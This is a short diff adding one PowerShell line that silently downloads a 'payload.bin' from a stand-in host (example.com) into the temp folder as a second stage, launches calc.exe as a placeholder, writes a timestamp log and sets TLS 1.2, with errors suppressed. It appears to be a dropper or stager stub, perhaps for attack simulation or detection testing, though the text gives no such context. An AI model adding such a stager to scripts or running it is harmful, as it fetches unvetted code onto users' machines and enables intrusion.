@@ -1,0 +1,2 @@
+
+$PayloadUrl = 'http://example.com/payload.bin'; $Stage2Path = "$env:TEMP\stage2.bin"; Start-BitsTransfer -Source $PayloadUrl -Destination $Stage2Path -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
